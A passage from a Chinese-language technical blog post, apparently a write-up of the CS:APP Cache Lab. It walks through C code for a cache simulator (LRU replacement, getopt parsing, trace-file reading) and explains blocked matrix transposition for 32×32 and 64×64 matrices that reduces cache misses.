*cur_set = cache[set_num];<br>  <span class="hljs-type">int</span> empty_index = <span class="hljs-number">-1</span>;<br>  <span class="hljs-type">int</span> min_ts_line_index = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; E; i++) &#123;<br>    <span class="hljs-comment">// 当前行存在于cache中，即valid=1，并且tag相同</span><br>    <span class="hljs-keyword">if</span> (cur_set[i].valid == <span class="hljs-number">1</span> &amp;&amp; cur_set[i].tag == tag) &#123;<br>      hit_count++;<br>      <span class="hljs-comment">// 记得更新时间戳</span><br>      cur_set[i].time_stamp = time_stamp++;<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br>    <span class="hljs-comment">// 如果存在空行，即valid=0；</span><br>    <span class="hljs-keyword">if</span> (cur_set[i].valid == <span class="hljs-number">0</span>) &#123;<br>      empty_index = i;<br>    &#125;<br>    <span class="hljs-comment">// 记录时间戳最小的，实在不行就要去替换了</span><br>    <span class="hljs-keyword">if</span> (cur_set[i].time_stamp &lt; cur_set[min_ts_line_index].time_stamp) &#123;<br>      min_ts_line_index = i;<br>    &#125;<br>  &#125;<br>  <span class="hljs-comment">// 如果没有命中，那么就发生了miss</span><br>  miss_count++;<br>  <span class="hljs-comment">// 载入某一行，如果有空行，就载入空行</span><br>  <span class="hljs-comment">// 如果没有空行，则载入时间戳最小的，这就发生了evict</span><br>  <span class="hljs-keyword">if</span> (empty_index != <span class="hljs-number">-1</span>) &#123;<br>    LoadOrEvict(cur_set, empty_index, tag);<br>  &#125; <span class="hljs-keyword">else</span> &#123;<br>    LoadOrEvict(cur_set, min_ts_line_index, tag);<br>    eviction_count++;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol></li></ol><h2 id="整体代码结构"><a href="#整体代码结构" class="headerlink" title="整体代码结构"></a>整体代码结构</h2><p>这个实验的关键部分就这么多。剩下的有点类似于脏活累活，但是也很有意义。先看一下整体的代码结构<br>可以分为以下几个部分</p><ol><li>解析命令行参数</li><li>根据解析出来的参数初始化我们的cache</li><li>读取文件里的操作，并进行操作</li><li>输出结果</li><li>释放申请的变量<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>  <span class="hljs-comment">// 解析命令行参数</span><br>  <span class="hljs-type">int</span> par_res = parser(argc, argv);<br>  <span class="hljs-keyword">if</span> (par_res == <span class="hljs-number">-1</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-comment">// 创造cache，初始化cache</span><br>  Init();<br>  <span class="hljs-comment">// 读取文件，获得操作，进行操作</span><br>  <span class="hljs-type">int</span> get_res = GetOperation();<br>  <span class="hljs-keyword">if</span> (get_res == <span class="hljs-number">-1</span>) &#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>;<br>  &#125;<br>  <span class="hljs-comment">// 输出结果</span><br>  printSummary(hit_count, miss_count, eviction_count);<br>  <span class="hljs-comment">// 释放malloc申请的变量</span><br>  Destory();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="命令行参数解析部分"><a href="#命令行参数解析部分" class="headerlink" title="命令行参数解析部分"></a>命令行参数解析部分</h2><p>首先是我们通过命令行启动程序，那么我们的参数都是在命令行中给出的，如何解析命令行的参数呢？需要使用<code>getopt</code>函数。<br>这个函数的三个参数</p><ol><li>程序参数的数量</li><li>argv可以理解为一个二维数组，如果我们的输入是这样的<code>./my_program -f input.txt -o output.txt</code>，那么argv的实际参数是这样的<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">argv[<span class="hljs-number">0</span>] -&gt; <span class="hljs-string">&quot;./my_program&quot;</span><br>argv[<span class="hljs-number">1</span>] -&gt; <span class="hljs-string">&quot;-f&quot;</span><br>argv[<span class="hljs-number">2</span>] -&gt; <span class="hljs-string">&quot;input.txt&quot;</span><br>argv[<span class="hljs-number">3</span>] -&gt; <span class="hljs-string">&quot;-o&quot;</span><br>argv[<span class="hljs-number">4</span>] -&gt; <span class="hljs-string">&quot;output.txt&quot;</span><br></code></pre></td></tr></table></figure></li><li>第三个参数是我们参数的format，如果是这样的”hvs:E:b:t:”，那就说明我们有hvsEbt这六种参数，并且后面跟着冒号的说明这些参数还有值<br>这个函数的返回值，这里用opt记录，就是读取到的参数。<br>最后还有一个变量叫optrag，这个需要我们声明，只要我们正确声明了getopt函数的头文件，这个变量就存在了。代表了当前参数对应的值。<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">parser</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> *argv[])</span> &#123;<br>  <span class="hljs-comment">// 解析参数</span><br>  <span class="hljs-type">int</span> opt;<br>  <span class="hljs-keyword">while</span> ((opt = getopt(argc, argv, <span class="hljs-string">&quot;hvs:E:b:t:&quot;</span>)) != <span class="hljs-number">-1</span>) &#123;<br>    <span class="hljs-keyword">switch</span> (opt) &#123;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;h&#x27;</span>:<br>      h_flag = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;v&#x27;</span>:<br>      v_flag = <span class="hljs-number">1</span>;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;s&#x27;</span>:<br>      s = atoi(optarg);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;E&#x27;</span>:<br>      E = atoi(optarg);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;b&#x27;</span>:<br>      b = atoi(optarg);<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;t&#x27;</span>:<br>      tracefile = optarg;<br>      <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;?&#x27;</span>:<br>      <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;未知选项或缺少参数\n&quot;</span>);<br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>  &#125;<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure></li></ol><h2 id="初始化cache部分"><a href="#初始化cache部分" class="headerlink" title="初始化cache部分"></a>初始化cache部分</h2><p>首先，我们的cache的定义是这样的<code>cacheline ** cache</code>，因此要用二维数组的方式对这个cache进行初始化。<br>先分配出S个行，然后给每行分配出E列</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Init</span><span class="hljs-params">()</span> &#123;<br>  S = <span class="hljs-number">1</span> &lt;&lt; s;<br>  cache = (cache_line **)<span class="hljs-built_in">malloc</span>(S * <span class="hljs-keyword">sizeof</span>(cache_line *));<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; S; i++) &#123;<br>    cache[i] = (cache_line *)<span class="hljs-built_in">malloc</span>(E * <span class="hljs-keyword">sizeof</span>(cache_line));<br>    <span class="hljs-comment">// 记得初始化每一行的tag为0</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; E; j++) &#123;<br>      cache[i][j].tag = <span class="hljs-number">0</span>;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="读取文件的操作"><a href="#读取文件的操作" class="headerlink" title="读取文件的操作"></a>读取文件的操作</h2><p>首先，我们读取进来的tracefile其实只是一个文件名，还需要根据这个文件名去真正的取到这个文件<br>这就要使用这个了<code>FILE *file_ptr;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">GetOperation</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-comment">// 读取文件，获得访问记录</span><br>  file_ptr = fopen(tracefile, <span class="hljs-string">&quot;r&quot;</span>);<br>  <span class="hljs-keyword">if</span> (file_ptr == <span class="hljs-literal">NULL</span>) &#123;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;无法打开文件 %s\n&quot;</span>, tracefile);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>  &#125;<br>  <span class="hljs-type">char</span> buffer[<span class="hljs-number">100</span>];<br>  <span class="hljs-type">char</span> command;<br>  <span class="hljs-type">int</span> address;<br>  <span class="hljs-type">int</span> size;<br>  <span class="hljs-keyword">while</span> (fgets(buffer, <span class="hljs-keyword">sizeof</span>(buffer), file_ptr)) &#123;<br>    <span class="hljs-keyword">if</span> (buffer[<span class="hljs-number">0</span>] == <span class="hljs-string">&#x27;I&#x27;</span>) &#123;<br>      <span class="hljs-keyword">continue</span>;<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">sscanf</span>(buffer, <span class="hljs-string">&quot; %c %x,%d&quot;</span>, &amp;command, &amp;address, &amp;size) == <span class="hljs-number">3</span>) &#123;<br>      <span class="hljs-comment">// 成功获取操作</span><br>      Func(command, address, size);<br>      <span class="hljs-comment">// printf(&quot;%c %x,%d\n&quot;, command, address, size);</span><br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>      <span class="hljs-comment">// 输入不合法</span><br>      <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>    &#125;<br>  &#125;<br>  fclose(file_ptr);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="释放内存的操作"><a href="#释放内存的操作" class="headerlink" title="释放内存的操作"></a>释放内存的操作</h2><p>申请了多少就释放多少，先释放列，再释放行</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">Destory</span><span class="hljs-params">()</span> &#123;<br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; S; i++) &#123;<br>    <span class="hljs-built_in">free</span>(cache[i]);<br>  &#125;<br>  <span class="hljs-built_in">free</span>(cache);<br>&#125;<br></code></pre></td></tr></table></figure><p>整体来说，这个实验并不难。因为根本没用到什么难的算法，暴力遍历就完事了。<br>但是因为前前后后所有内容都需要自己实验，还是有不少dirtywork的，这可能比较像真正工作上写的代码，而不是算法题的代码</p><h1 id="cache转置"><a href="#cache转置" class="headerlink" title="cache转置"></a>cache转置</h1><p>给我们的cache配置是<code>s = 5, E = 1, b = 5</code><br>即有32个set，每个set有一行，即直接映射，每一行可以存储32字节，即每个set可以存储8个整数</p><h2 id="32×32"><a href="#32×32" class="headerlink" title="32×32"></a>32×32</h2><p>首先，我们要做的是尽量减少miss，即让我们的cache尽可能的去命中。<br>那么如果直接按照一行一行的操作，会有什么问题呢？</p><ol><li>对于A，问题倒还好，只要B不会干扰到它的行，那么A的命中率就是7&#x2F;8</li><li>但是对于B呢？B是按列来访问的，极有可能cache命中的次数为0<br>那么分块又是为什么可以优化呢？<br>因为分块的情况下，加入是按4×4的大小分块，那么我们最多使用B的某4列，那么B的命中率很有可能达到3&#x2F;4，为什么说是很可能呢，因为A和B之间可能也会有点干扰，但是这总比之前很可能命中率为0好。<br>综上所述，通过分块是有可能有效降低cache miss的次数的，现在就要研究到底怎么分块了。<br>32×32代表的是每行每列都是32个整数，可以去看<a href="https://wdxtub.com/csapp/thick-csapp-lab-4/2016/04/16/">这位大佬的图</a><br>可以发现，如果通过8×8的分块方式，这个8×8的小块内部是不会冲突的</li><li>这个不冲突对于A来说其实没啥用，因为A本来就是按行来访问的</li><li>但是对B来说，这就很重要了，因为B是按列来访问的，如果这个小块内部冲突，那B就会不断的替换cache<br>由此可以写出下面这个代码。但是可以发现这个代码拿不到满分，因为满分要求300次miss以内，而这个代码是343<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">transpose_submit</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span> &#123;<br>  <span class="hljs-comment">// i和j枚举出了每个8×8的矩阵的左顶点</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i += <span class="hljs-number">8</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">32</span>; j += <span class="hljs-number">8</span>) &#123;<br>      <span class="hljs-comment">// cnti和cntj则分别枚举这个小矩阵的行和列</span><br>      <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> cnti = <span class="hljs-number">0</span>; cnti &lt; <span class="hljs-number">8</span>; cnti++) &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> cntj=<span class="hljs-number">0</span>;cntj&lt;<span class="hljs-number">8</span>;cntj++)&#123;<br>            B[j+cntj][i+cnti]=A[i+cnti][j+cntj];<br>        &#125;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure>为什么呢？因为，A和B之间存在打架的情况。通过打印地址是可以发现A和B的距离很尴尬，使得A和B的任意一个cacheline都是映射到同一个cache。</li><li>其实这也没太大关系，因为我们在A和B中取的8×8的块并不是相同位置，而是根据对角线对称之后的位置，这是没关系的，因为根据上面那位大佬博客里的图可以发现，对称之后其实A和B就不会撞车。</li><li>但是，在对角线的时候，就会出现问题，这时候A和B会撞车。那么该如何优化呢？</li></ol><p>可以通过csapp第五章介绍的循环展开的方式来优化，我们可以提前把A的这一行的八个int给取出来，这会将它放到寄存器里，然后我们再去修改B，这时候就不会撞车了。具体实现如下。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">transpose_submit</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span> &#123;<br>  <span class="hljs-comment">// i和j枚举出了每个8×8的矩阵的左顶点</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">32</span>; i += <span class="hljs-number">8</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">32</span>; j += <span class="hljs-number">8</span>) &#123;<br>      <span class="hljs-comment">// cnt枚举的是小矩阵的行数</span><br>      <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> cnt=<span class="hljs-number">0</span>;cnt&lt;<span class="hljs-number">8</span>;cnt++)&#123;<br>        <span class="hljs-type">int</span> temp1 = A[i + cnt][j];<br>        <span class="hljs-type">int</span> temp2 = A[i + cnt][j + <span class="hljs-number">1</span>];<br>        <span class="hljs-type">int</span> temp3 = A[i + cnt][j + <span class="hljs-number">2</span>];<br>        <span class="hljs-type">int</span> temp4 = A[i + cnt][j + <span class="hljs-number">3</span>];<br>        <span class="hljs-type">int</span> temp5 = A[i + cnt][j + <span class="hljs-number">4</span>];<br>        <span class="hljs-type">int</span> temp6 = A[i + cnt][j + <span class="hljs-number">5</span>];<br>        <span class="hljs-type">int</span> temp7 = A[i + cnt][j + <span class="hljs-number">6</span>];<br>        <span class="hljs-type">int</span> temp8 = A[i + cnt][j + <span class="hljs-number">7</span>];<br><br>        B[j][i + cnt] = temp1;<br>        B[j + <span class="hljs-number">1</span>][i + cnt] = temp2;<br>        B[j + <span class="hljs-number">2</span>][i + cnt] = temp3;<br>        B[j + <span class="hljs-number">3</span>][i + cnt] = temp4;<br>        B[j + <span class="hljs-number">4</span>][i + cnt] = temp5;<br>        B[j + <span class="hljs-number">5</span>][i + cnt] = temp6;<br>        B[j + <span class="hljs-number">6</span>][i + cnt] = temp7;<br>        B[j + <span class="hljs-number">7</span>][i + cnt] = temp8;<br>      &#125;<br>    &#125;<br>  &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>总结来说</p><ol><li>避免自己跟自己冲突，因此选择8×8，而不是9×9或以上</li><li>避免别人和自己冲突，这里采用了让寄存器来帮忙的方法</li></ol><h2 id="64×64"><a href="#64×64" class="headerlink" title="64×64"></a>64×64</h2><p>64×64就不能直接用8×8了，同样可以先看上面那位大佬的博客画的，使用8乘8的矩阵，自己就和自己冲突了。<br>而如果使用4×4的，小矩阵内部倒不会冲突，但是因为每次取8个，结果只用了4个，后面还得再取一次，又要碰撞一次。<br>所以，8×8地访问还是最适合的，因为不会出现二次访问的需求。但是如果直接使用8×8的方式，又会导致自己不断地撞自己。<br>那综合一下上面的问题，</p><ol><li>主要就是我们每次取一个cacheline，这个cacheline都包括了8个数字</li><li>但是我们如果用4×4的小矩阵去处理，就会导致同一行需要取两次</li><li>而如果直接使用8×8去取，会导致列操作的那个矩阵不断地撞自己。</li></ol><p>有一些大佬就提出了一种方法，我们以8×8的小矩阵去取数据，然后将它分成4个4×4的小矩阵</p><ol start="4"><li>当我们处理A的左上小矩阵时，需要将它放到B的左上小矩阵，这时候我们的cache里有A的4个cache行，B的4个cache行（不在对角线的情况下）</li><li>正常情况下，我们会去操作A的右上小矩阵，将它放到B的左下小矩阵。注意，在这个时候，我们操作A的右上小矩阵是不会发生cache miss的，因为A的前4个cache行就在cache中。但是如果我们访问B的左下小矩阵，那就出问题了。因为B的下4个cache行和B的上4个cache行冲突了。</li><li>但是如果我们不正常，我们把A的右上小矩阵，存到B的右上小矩阵中，那就不会发生额外的碰撞了。因为只涉及了A和B的前4个cache行。</li></ol><p>那么如果操作到这里，A的前4个cache行已经全部用完了，后面不会再访问了，并且除去对角线情况，命中率应该是7&#x2F;8</p><p>接下来，我们操作A的左下矩阵，将其放到B的右上矩阵。而B的右上矩阵暂存了A的右上矩阵，这个矩阵应该是放到B的左下矩阵的。所以接下来的这一波操作是关键。</p><ol start="7"><li>首先，我们按列取出A的左下矩阵，然后按行取出B的右上矩阵</li><li>接下来，将B的右上矩阵置为A的左下矩阵，然后将B的左下矩阵置为取出的B的右上矩阵<br>这里有个细节，就在于我们是按行取出B的右上矩阵的。为什么说它细节呢？</li><li>首先，我们进行到这个阶段的时候，cache中有B的前4行cacheline。</li><li>而我们这个阶段需要修改B的左下矩阵，这就涉及到了B的下4行。</li><li>如果我们在这个阶段按行操作B<ol><li>那么取出B的右上矩阵的某一行（这一行存的其实是B的左下矩阵的值，如果不清楚，回去看看第一波操作）</li><li>然后我们再紧接着将这一行修改为正确的值，</li></ol></li><li>至此，B的这一行将永远不再需要被访问。然后它就会被下4行中对应的那一个给替换掉。<br>而如果是按列取出B的右上矩阵呢？那就不断地碰撞，miss。</li></ol><p>最后一波操作，就是把A的右下矩阵给放到B的右下矩阵中去，这就很轻松了，基本不会miss。<br>代码实现如下，这个操作说起来还是很抽象的，对着代码看，更加清楚。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> <span class="hljs-title function_">deal_64_64</span><span class="hljs-params">(<span class="hljs-type">int</span> M, <span class="hljs-type">int</span> N, <span class="hljs-type">int</span> A[N][M], <span class="hljs-type">int</span> B[M][N])</span> &#123;<br>  <span class="hljs-comment">// i和j枚举出了每个8×8的矩阵的左顶点</span><br>  <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">64</span>; i += <span class="hljs-number">8</span>) &#123;<br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> j = <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">64</span>; j += <span class="hljs-number">8</span>) &#123;<br>      <span class="hljs-type">int</span> temp1, temp2, temp3, temp4, temp5, temp6, temp7, temp8;<br>      <span class="hljs-type">int</span> cnti, cntj;<br>      <span class="hljs-comment">// 现在处理A的左上4×4，顺便操作一下A的右上4×4</span><br>      <span class="hljs-keyword">for</span> (cnti = <span class="hljs-number">0</span>; cnti &lt; <span class="hljs-number">4</span>; cnti++) &#123;<br>        <span class="hljs-comment">// 取出A的左上，以行的方式</span><br>        temp1 = A[i + cnti][j];<br>        temp2 = A[i + cnti][j + <span class="hljs-number">1</span>];<br>        temp3 = A[i + cnti][j + <span class="hljs-number">2</span>];<br>        temp4 = A[i + cnti][j + <span class="hljs-number">3</span>];<br>        <span class="hljs-comment">// 取出A的右上，以行的方式</span><br>        temp5 = A[i + cnti][j + <span class="hljs-number">4</span>];<br>        temp6 = A[i + cnti][j + <span class="hljs-number">5</span>];<br>        temp7 = A[i + cnti][j + <span class="hljs-number">6</span>];<br>        temp8 = A[i + cnti][j + <span class="hljs-number">7</span>];<br>        <span class="hljs-comment">// 将A的左上放到正确的地方，以列的方式</span><br>        B[j][i + cnti] = temp1;<br>        B[j + <span class="hljs-number">1</span>][i + cnti] = temp2;<br>        B[j + <span class="hljs-number">2</span>][i + cnti] = temp3;<br>        B[j + <span class="hljs-number">3</span>][i + cnti] = temp4;<br>        <span class="hljs-comment">// 将A的右上放到现在B的右上，提前处理一下，省的后面还要访问A的这个cacheline</span><br>        B[j][i + cnti + <span class="hljs-number">4</span>] = temp5;<br>        B[j + <span class="hljs-number">1</span>][i + cnti + <span class="hljs-number">4</span>] = temp6;<br>        B[j + <span class="hljs-number">2</span>][i + cnti + <span class="hljs-number">4</span>] = temp7;<br>        B[j + <span class="hljs-number">3</span>][i + cnti + <span class="hljs-number">4</span>] = temp8;<br>      &#125;<br>      <span class="hljs-comment">// 至此，A的前4行已经全部处理完了，命中率约为7/8</span><br>      <span class="hljs-comment">// 上述操作处理完之后，B的前4行都在cache中</span><br>      <span class="hljs-comment">// 现在处理A的左下，将其移到B的右上，同时我们已经把A的右上存在了B的右上</span><br>      <span class="hljs-comment">// 所以要记得取下来，放到B的左下去</span><br>      <span class="hljs-keyword">for</span> (cntj = <span class="hljs-number">0</span>; cntj &lt; <span class="hljs-number">4</span>; cntj++) &#123;<br>        <span class="hljs-comment">// 取出A的左下，一列一列地取</span><br>        temp1 = A[i + <span class="hljs-number">4</span>][j + cntj];<br>        temp2 = A[i + <span class="hljs-number">5</span>][j + cntj];<br>        temp3 = A[i + <span class="hljs-number">6</span>][j + cntj];<br>        temp4 = A[i + <span class="hljs-number">7</span>][j + cntj];<br>        <span class="hljs-comment">// 取出当前B的右上，一行一行地取，之后还要一行一行地放到B的左下</span><br>        temp5 = B[j + cntj][i + <span class="hljs-number">4</span>];<br>        temp6 = B[j + cntj][i + <span class="hljs-number">5</span>];<br>        temp7 = B[j + cntj][i + <span class="hljs-number">6</span>];<br>        temp8 = B[j + cntj][i + <span class="hljs-number">7</span>];<br>        <span class="hljs-comment">// 修改B的右上为真正的值，即A的左下</span><br>        B[j + cntj][i + <span class="hljs-number">4</span>] = temp1;<br>        B[j + cntj][i + <span class="hljs-number">5</span>] = temp2;<br>        B[j + cntj][i + <span class="hljs-number">6</span>] = temp3;<br>        B[j + cntj][i + <span class="hljs-number">7</span>] = temp4;<br>        <span class="hljs-comment">// 至此B的这一行完全OK了，虽然马上就要被自己干掉，但是也没关系，反正也用不上了</span><br>        <span class="hljs-comment">// 接下来别忘了修改B的左下，本来应该是A的右上，但是我们提前存在了B的右上</span><br>        <span class="hljs-comment">// 现在就是temp5-8</span><br>        B[j + cntj + <span class="hljs-number">4</span>][i] = temp5;<br>        B[j + cntj + <span class="hljs-number">4</span>][i + <span class="hljs-number">1</span>] = temp6;<br>        B[j + cntj + <span class="hljs-number">4</span>][i + <span class="hljs-number">2</span>] = temp7;<br>        B[j + cntj + <span class="hljs-number">4</span>][i + <span class="hljs-number">3</span>] = temp8;<br>      &#125;<br>      <span class="hljs-comment">// 最后修改B的右下</span><br>      <span class="hljs-keyword">for</span> (cnti = <span class="hljs-number">4</span>; cnti &lt; <span class="hljs-number">8</span>; cnti++) &#123;<br>        temp1 = A[i + cnti][j + <span class="hljs-number">4</span>];<br>        temp2 = A[i + cnti][j + <span class="hljs-number">5</span>];<br>        temp3 = A[i + cnti][j + <span class="hljs-number">6</span>];<br>        temp4 = A[i + cnti][j + <span class="hljs-number">7</span>];<br>        B[j + <span class="hljs-number">4</span>][i + cnti] = temp1;<br>        B[j + <span class="hljs-number">5</span>][i + cnti] = temp2;<br>        B[j + <span class="hljs-number">6</span>][i + cnti] = temp3;<br>        